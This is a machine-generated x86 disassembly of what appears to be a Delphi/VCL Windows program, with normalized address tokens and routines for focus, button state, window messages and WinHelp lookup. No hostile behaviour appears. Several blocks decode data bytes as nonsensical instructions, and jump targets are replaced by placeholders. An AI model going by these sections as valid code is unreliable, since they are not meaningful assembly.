je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_44e7a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e81f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e826
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_44e82c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_44e86c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_44e8b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e8bc
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_44e8c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_458040
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_44e8e8
push ebx
mov ebx eax
mov eax ebx
call sub_461ee0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e920
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_44e976
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_44e984
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_458074
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_44e9d8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_45ce0c
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_44ea2c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44ea50
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_459d5c
mov eax ebx
mov si 0xffb5
call sub_4033e8
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_45c380
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_4033e8
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_44eac8
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_44ae1c
mov ebx eax
mov eax ebx
call sub_44aefc
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_45c380
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_44b094
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44eb14
push ebx
push esi
mov esi edx
mov ebx eax
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_45a79c
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_44eb40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4591d4
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_44eb78
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e984
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_455208
mov edx 0x19
mov eax esi
call sub_45522c
mov dl 0x1
mov eax esi
call sub_45c5b4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_44ec04
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_45c684
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_45c380
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_45c380
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_44ec58
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46cc58
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_456c00
sub_44ec8c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44eb40
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_459100
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_44ecf4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_45b7c4
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_46cb60
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_4033e8
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4033e8
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ed61
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44edda
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_455a4c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_46cbe8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45b7cc
mov eax ebx
mov si 0xffb8
call sub_4033e8
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4033e8
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ede1
sub_44ede8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_45b7d4
pop edi
pop esi
pop ebx
retn
sub_44ee3c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_44ee68
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_44ae1c
mov ebx eax
mov eax ebx
call sub_44aefc
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_45c380
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_44b094
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44eeb4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e984
mov edx 0x71
mov eax esi
call sub_455208
mov edx 0x11
mov eax esi
call sub_45522c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_44ef1c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_4033e8
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_44ef5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_45903c
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_462174
sub_44f018
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45c5b4
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call SendMessageA
push ebp
call sub_44ef5c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_455658
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_4033e8
sub_44f0a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44eb40
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_459100
mov eax ebx
mov si 0xffc8
call sub_4033e8
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_44f0fb
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5e05173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_45c380
push eax
call SendMessageA
pop ebx
retn
sub_44f130
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f1a5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_455a4c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_46cbe8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45b7cc
mov eax ebx
mov si 0xffb8
call sub_4033e8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f1ac
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_44f1b4
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_4033e8
jmp r-xdata
pop esi
retn
sub_44f1e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44f209
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f210
retn
sub_44f22d
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0xa00044 ] bh
add [ eax ] al
nop
pop ss
inc esi
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] bl
and [ esi ] al
push 0x64004620
push ss
inc edx
add al bl
xchg ebx eax
inc ecx
add [ edi + edx ] bh
inc edx
add [ eax - 0x27ffbde4 ] bl
sbb [ esi ] eax
xor al 0x25
inc esi
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax ] dl
inc esp
add [ eax + 0x1d ] bl
inc edx
add ah bh
sbb al 0x42
add [ eax - 0x3fffbde4 ] dl
sbb al 0x42
add [ esp + ebx + 0x1b2c0042 ] dl
inc esi
add [ ebx + 0x46 ] bl
add ah dh
and al [ esi ]
mov [ esi ] ah
inc esi
add [ ebx ] cl
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x69746341
outsd
outsb
int3
sub_44f310
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_461fc4
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_44f34c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44f371
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f378
retn
sub_44f530
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f5e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f7c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404014
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f5ec
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042fc
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_44f600
push ebx
mov ebx eax
mov eax ebx
call sub_44f930
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4058a0
sub_44f63c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f6a3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_44f530
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f6aa
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_44f6b4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44f73c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44f628
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042fc
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f743
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
sub_44f74f
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44f7d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44fe74
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f7de
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_44f530
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44f75c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44f7d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44fe74
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f7de
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_44f530
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44f7e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f8dc
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_44f530
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409070
mov eax ebx
call sub_44fe74
test al al
je r-xdata
mov ecx sub_44f384
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f8e3
lea eax [ ebp - 0x1c ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_44f530
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_44fdcc
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403fd0
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_40443c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44f94c
push ebx
mov ebx eax
mov eax ebx
call sub_44f930
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4058a0
pop ebx
retn
mov eax rw-data
call sub_4058a0
sub_44f97c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44f9d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f9db
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_44f530
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_44f9e4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44fada
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_409030
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_44f530
mov eax ebx
call sub_44fe74
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fae1
lea eax [ ebp - 0x110 ]
call sub_403f7c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041ec
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_44fdcc
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041ec
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44faf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44fb5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fb61
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44f530
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_44fb6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44fbec
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_44f530
mov eax ebx
call sub_44fe74
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fbf3
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44fdcc
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44fbfc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_44fce7
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_44fe74
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fcee
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fa0
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_4081bc
